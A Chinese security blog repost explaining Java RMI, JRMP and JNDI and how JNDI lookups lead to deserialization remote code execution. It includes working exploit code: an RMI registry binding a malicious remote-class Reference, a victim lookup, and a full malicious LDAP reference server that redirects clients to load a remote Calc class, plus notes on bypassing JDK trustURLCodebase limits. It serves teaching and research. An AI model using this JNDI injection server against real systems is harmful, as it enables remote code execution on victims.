<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Java反序列化,RMI、JRMP、JNDI,">










<meta name="description" content="文章转载自先知社区：https://xz.aliyun.com/t/7079 0 前言以往看到很多讲述RMI、JNDI、JRMP的文章，有部分文章都描述的并不是很清晰，看着通篇大论，觉得很详细，但看完之后却搞不懂，也解释不清，反正就是感觉自己还没搞懂，却又好像懂了点，很迷糊… 这篇文章，我想要的就是以最简短的内容和例子，去阐述RMI、JNDI、JRMP…，并讲讲为什么用InitialContext">
<meta name="keywords" content="Java反序列化,RMI、JRMP、JNDI">
<meta property="og:type" content="article">
<meta property="og:title" content="基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI">
<meta property="og:url" content="http://yoursite.com/2020/01/15/基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI/index.html">
<meta property="og:site_name" content="大彩笔threedr3am">
<meta property="og:description" content="文章转载自先知社区：https://xz.aliyun.com/t/7079 0 前言以往看到很多讲述RMI、JNDI、JRMP的文章，有部分文章都描述的并不是很清晰，看着通篇大论，觉得很详细，但看完之后却搞不懂，也解释不清，反正就是感觉自己还没搞懂，却又好像懂了点，很迷糊… 这篇文章，我想要的就是以最简短的内容和例子，去阐述RMI、JNDI、JRMP…，并讲讲为什么用InitialContext">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://threedr3am.oss-cn-hangzhou.aliyuncs.com/%E5%85%88%E7%9F%A5/2351578379904_.pic_hd.jpg">
<meta property="og:updated_time" content="2020-02-13T05:35:12.683Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI">
<meta name="twitter:description" content="文章转载自先知社区：https://xz.aliyun.com/t/7079 0 前言以往看到很多讲述RMI、JNDI、JRMP的文章，有部分文章都描述的并不是很清晰，看着通篇大论，觉得很详细，但看完之后却搞不懂，也解释不清，反正就是感觉自己还没搞懂，却又好像懂了点，很迷糊… 这篇文章，我想要的就是以最简短的内容和例子，去阐述RMI、JNDI、JRMP…，并讲讲为什么用InitialContext">
<meta name="twitter:image" content="https://threedr3am.oss-cn-hangzhou.aliyuncs.com/%E5%85%88%E7%9F%A5/2351578379904_.pic_hd.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/01/15/基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI/">





  <title>基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI | 大彩笔threedr3am</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?8346bb07e7843cd10a2ee33017b3d627";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">大彩笔threedr3am</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/15/基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="threedr3am">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="大彩笔threedr3am">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-15T13:13:00+08:00">
                2020-01-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/java漏洞分析/" itemprop="url" rel="index">
                    <span itemprop="name">java漏洞分析</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>文章转载自先知社区：<a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a></p>
<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h3><p>以往看到很多讲述RMI、JNDI、JRMP的文章，有部分文章都描述的并不是很清晰，看着通篇大论，觉得很详细，但看完之后却搞不懂，也解释不清，反正就是感觉自己还没搞懂，却又好像懂了点，很迷糊…</p>
<p>这篇文章，我想要的就是以最简短的内容和例子，去阐述RMI、JNDI、JRMP…，并讲讲为什么用InitialContext lookup一个JNDI的rmi、ldap服务会导致自身被反序列化RCE，为什么Registry bind暴露一个服务对象到RmiRegistry会导致Registry服务自身被反序列化RCE，为什么使用JRMP能互相对打等等。虽然我不能百分百保证我写的毫无错误，但是，我觉得你看了这篇文章之后，大概应该就懂了。</p>
<a id="more"></a>
<h3 id="1-搞懂概念"><a href="#1-搞懂概念" class="headerlink" title="1 搞懂概念"></a>1 搞懂概念</h3><h4 id="1-1-RMI"><a href="#1-1-RMI" class="headerlink" title="1.1 RMI"></a>1.1 RMI</h4><p>以下是wiki的描述：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</span><br><span class="line"></span><br><span class="line">Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。</span><br></pre></td></tr></table></figure>
<p>根据wiki所说RMI全称为Remote Method Invocation，也就是远程方法调用，通俗点解释，就是跨越jvm，调用一个远程方法。众所周知，一般情况下java方法调用<br>指的是同一个jvm内方法的调用，而RMI与之恰恰相反。</p>
<p>例如我们使用浏览器对一个http协议实现的接口进行调用，这个接口调用过程我们可以称之为Interface Invocation，而RMI的概念与之非常相似，只不过RMI调用的是一个Java方法，而浏览器调用的是一个http接口。并且Java中封装了RMI的一系列定义。</p>
<p>到这里了，我这边做个简短通俗的总结：RMI是一种行为，这种行为指的是Java远程方法调用。</p>
<h4 id="1-2-JRMP"><a href="#1-2-JRMP" class="headerlink" title="1.2 JRMP"></a>1.2 JRMP</h4><p>以下是wiki的描述：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</span><br></pre></td></tr></table></figure>
<p>根据wiki所说JRMP全称为Java Remote Method Protocol，也就是Java远程方法协议，通俗点解释，它就是一个协议，一个在TCP/IP之上的线路层协议，一个RMI的过程，是用到JRMP这个协议去组织数据格式然后通过TCP进行传输，从而达到RMI，也就是远程方法调用。</p>
<p>还是前面所说的例子，我们在使用浏览器进行访问一个网络上的接口时，它和服务器之间的数据传输以及数据格式的组织，是用到基于TCP/IP之上的HTTP协议，只有通过这个HTTP协议，浏览器和服务端约定好的一个协议，它们之间才能正常的交流通讯。而JRMP也是一个与之相似的协议，只不过JRMP这个协议仅用于Java RMI中。</p>
<p>总结的来说：JRMP是一个协议，是用于Java RMI过程中的协议，只有使用这个协议，方法调用双方才能正常的进行数据交流。</p>
<h4 id="1-3-JNDI"><a href="#1-3-JNDI" class="headerlink" title="1.3 JNDI"></a>1.3 JNDI</h4><p>以下是wiki的描述：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</span><br></pre></td></tr></table></figure>
<p>根据wiki的描述，JNDI全称为Java Naming and Directory Interface，也就是Java命名和目录接口。既然是接口，那么就必定有其实现，而目前我们Java中使用最多的基本就是rmi和ldap的目录服务系统。而命名的意思就是，在一个目录系统，它实现了把一个服务名称和对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端。而目录的意思就是在命名的基础上，增加了属性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。而JNDI中的目录服务中的属性大概也与之相似，因此，我们就能在使用服务名称以外，通过一些关联属性查找到对应的对象。</p>
<p>总结的来说：JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。</p>
<h3 id="2-以攻击例子来阐述"><a href="#2-以攻击例子来阐述" class="headerlink" title="2 以攻击例子来阐述"></a>2 以攻击例子来阐述</h3><p>前言已经说了“去阐述RMI、JNDI、JRMP…，并讲讲为什么用InitialContext lookup一个JNDI的rmi、ldap服务会导致自身被反序列化RCE，为什么Registry bind暴露一个服务对象到RmiRegistry会导致Registry服务自身被反序列化RCE，为什么使用JRMP能互相对打等等”</p>
<h4 id="2-1-为什么用InitialContext-lookup一个JNDI的rmi、ldap服务会导致自身被反序列化RCE"><a href="#2-1-为什么用InitialContext-lookup一个JNDI的rmi、ldap服务会导致自身被反序列化RCE" class="headerlink" title="2.1 为什么用InitialContext lookup一个JNDI的rmi、ldap服务会导致自身被反序列化RCE"></a>2.1 为什么用InitialContext lookup一个JNDI的rmi、ldap服务会导致自身被反序列化RCE</h4><p>我们先看一个例子：</p>
<ul>
<li>程序A</li>
</ul>
<p>具有接口类HelloService和实现类HelloServiceImpl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public interface HelloService extends Remote &#123;</span><br><span class="line">    String sayHello() throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">public class HelloServiceImpl extends UnicastRemoteObject implements HelloService &#123;</span><br><span class="line">    protected HelloServiceImpl() throws RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String sayHello() throws RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;hello!&quot;);</span><br><span class="line">        return &quot;hello!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>启动了一个1099端口的Registry注册服务，并把HelloService接口的实现HelloServiceImpl暴露和注册到Registry注册服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">      registry.bind(&quot;hello&quot;, new HelloServiceImpl());</span><br><span class="line">    &#125; catch (RemoteException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; catch (AlreadyBoundException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>程序B</li>
</ul>
<p>具有接口类HelloService<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface HelloService extends Remote &#123;</span><br><span class="line">    String sayHello() throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>连接Registry并lookup查找到名为hello的对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">            HelloService helloService = (HelloService) registry.lookup(&quot;hello&quot;);</span><br><span class="line">            System.out.println(helloService.sayHello());</span><br><span class="line"></span><br><span class="line">        &#125; catch (NotBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>启动程序A后，再启动程序B</li>
</ul>
<p>在上述操作后，我们会发现程序A输出了hello，并且程序B也输出了hello。到底怎么回事呢？</p>
<p>其实，在程序A启动的时候，程序A启动了一个RMI的注册中心，接着把HelloServiceImpl暴露并注册到RMI注册中心，其中存储着HelloServiceImpl的stub数据，包含有HelloServiceImpl所在服务器的ip和port。在程序B启动之后，通过连接RMI注册中心，并从其中根据名称查询到了对应的对象（JNDI），并把其数据下载到本地，然后RMI会根据stub存储的信息，也就是程序A中HelloServiceImpl实现暴露的ip和port，最后通过JRMP协议发起RMI请求，RMI后，程序A输出hello并通过JRMP协议把hello的序列化数据返回给程序B，程序B对其反序列化后输出。</p>
<p>根据上述所说的流程，我们可以发现，如果要发起一个反序列化攻击，那么早在程序B lookup的时候，就会从Registry注册中心下载数据，前面也说了“服务名称和对象或命名引用相关联”，我们就可以通过程序A bind注册一个命名引用到Registry注册中心，也就是Reference，它具有三个参数，className、factory、classFactoryLocation，当程序B lookup它并下载到本地后，会使用Reference的classFactoryLocation指定的地址去下载className指定class文件，接着加载并实例化，从而在程序B lookup的时候实现加载远程恶意class实现RCE。</p>
<p>我们再来看一个例子：</p>
<ul>
<li>程序A</li>
</ul>
<p>创建了一个端口为1099的Registry注册中心，并注册了一个Reference到注册中心，该Reference引用了一个127.0.0.1中80端口http服务提供的Calc.class<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class App3</span><br><span class="line">&#123;</span><br><span class="line">    public static void main( String[] args )</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">            Reference reference = new Reference(&quot;Calc&quot;,&quot;Calc&quot;,&quot;http://127.0.0.1:80/&quot;);</span><br><span class="line">            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(&quot;hello&quot;,referenceWrapper);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>程序B</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class App4 &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/hello&quot;);</span><br><span class="line">        &#125; catch (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序启动后，发现报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ConfigurationException: The object factory is untrusted. Set the system property &apos;com.sun.jndi.rmi.object.trustURLCodebase&apos; to &apos;true&apos;.</span><br></pre></td></tr></table></figure>
<p>因为在jdk8u121版本开始，Oracle通过默认设置系统变量com.sun.jndi.rmi.object.trustURLCodebase为false，将导致通过rmi的方式加载远程的字节码不会被信任，想要绕过有两种方式：</p>
<ol>
<li>使用ldap服务取代rmi服务（在jdk8u191开始，引入JRP290，加入了反序列化类过滤）：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * LDAP server</span><br><span class="line"> *</span><br><span class="line"> * @author threedr3am</span><br><span class="line"> */</span><br><span class="line">public class LdapServer &#123;</span><br><span class="line"></span><br><span class="line">  private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    run();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void run() &#123;</span><br><span class="line">    int port = 1099;</span><br><span class="line">    //TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可</span><br><span class="line">    String url = &quot;http://localhost/#Calc&quot;;</span><br><span class="line">    try &#123;</span><br><span class="line">      InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">      config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">          &quot;listen&quot;, //$NON-NLS-1$</span><br><span class="line">          InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$</span><br><span class="line">          port,</span><br><span class="line">          ServerSocketFactory.getDefault(),</span><br><span class="line">          SocketFactory.getDefault(),</span><br><span class="line">          (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">      config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));</span><br><span class="line">      InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">      System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$</span><br><span class="line">      ds.startListening();</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line"></span><br><span class="line">    private URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     *</span><br><span class="line">     */</span><br><span class="line">    public OperationInterceptor(URL cb) &#123;</span><br><span class="line">      this.codebase = cb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * &#123;@inheritDoc&#125;</span><br><span class="line">     *</span><br><span class="line">     * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="line">     */</span><br><span class="line">    @Override</span><br><span class="line">    public void processSearchResult(InMemoryInterceptedSearchResult result) &#123;</span><br><span class="line">      String base = result.getRequest().getBaseDN();</span><br><span class="line">      Entry e = new Entry(base);</span><br><span class="line">      try &#123;</span><br><span class="line">        sendResult(result, base, e);</span><br><span class="line">      &#125; catch (Exception e1) &#123;</span><br><span class="line">        e1.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)</span><br><span class="line">        throws LDAPException, MalformedURLException &#123;</span><br><span class="line">      URL turl = new URL(this.codebase, this.codebase.getRef().replace(&apos;.&apos;, &apos;/&apos;).concat(&quot;&quot;));</span><br><span class="line">      System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">      e.addAttribute(&quot;javaClassName&quot;, &quot;Calc&quot;);</span><br><span class="line">      String cbstring = this.codebase.toString();</span><br><span class="line">      int refPos = cbstring.indexOf(&apos;#&apos;);</span><br><span class="line">      if (refPos &gt; 0) &#123;</span><br><span class="line">        cbstring = cbstring.substring(0, refPos);</span><br><span class="line">      &#125;</span><br><span class="line">      e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br><span class="line">      e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$</span><br><span class="line">      e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br><span class="line">      result.sendSearchEntry(e);</span><br><span class="line">      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>使用tomcat-el利用链：</li>
</ol>
